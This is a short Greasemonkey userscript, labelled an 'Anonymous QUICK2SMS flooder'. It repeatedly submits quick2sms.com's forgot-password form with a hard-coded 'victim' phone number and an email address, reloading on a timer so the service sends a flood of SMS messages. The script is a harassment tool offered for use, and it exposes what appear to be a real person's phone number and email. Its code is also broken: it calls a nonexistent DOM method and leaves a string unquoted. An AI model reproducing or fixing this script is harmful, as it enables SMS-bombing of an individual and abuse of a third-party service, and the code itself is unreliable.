// ==UserScript==
// @name          Anonymous QUICK2SMS flooder
// @namespace     SUNNY020
// @description   flooder sms
// @include       http://*quick2sms.com/*
// @credits       One
// ==/UserScript==

var victim=8092262928 //
var mail=jjsmail@gmail.com //
var delay=1000; // Enter delay in milliseconds if required

if(document.location=="http://www.quick2sms.com/forgot-password.asp?"||document.location=="http://www.quick2sms.com/forgot-password.asp?")
{
document.getElementByName('email').value=mail;
document.getElementByName('mobile').value=victim;
document.getElementByName('submit').click();
}
if(document.location=="http://www.quick2sms.com/forgot-password.asp?er=4"||document.location=="http://www.quick2sms.com/forgot-password.asp?er=4")
setTimeout("document.location='http://www.quick2sms.com/forgot-password.asp?'",delay);